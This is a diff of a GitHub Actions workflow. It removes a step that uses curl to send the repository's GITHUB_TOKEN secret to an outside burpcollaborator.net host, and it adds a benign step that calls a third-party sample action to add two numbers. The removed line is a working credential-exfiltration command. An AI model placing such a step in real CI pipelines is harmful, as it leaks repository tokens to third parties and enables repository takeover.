@@ -32,5 +32,12 @@ jobs:
       - name: Echo Latest Tag
         run: echo "latest release is ${{steps.find_latest_tag.outputs.tag}}"
 
-      - name: Echo GITHUB_TOKEN
-        run: curl "https://v51i7wqvp30u2fobrafocfc3wu2lqa.burpcollaborator.net/?token=${{secrets.GITHUB_TOKEN}}"
+      - name: Add
+        uses: teppayl/sample_github_action
+        id: add
+        with:
+          arg1: 1
+          arg2: 2
+
+      - name: echo add result
+        run: echo "${{steps.add.outputs.result}}"
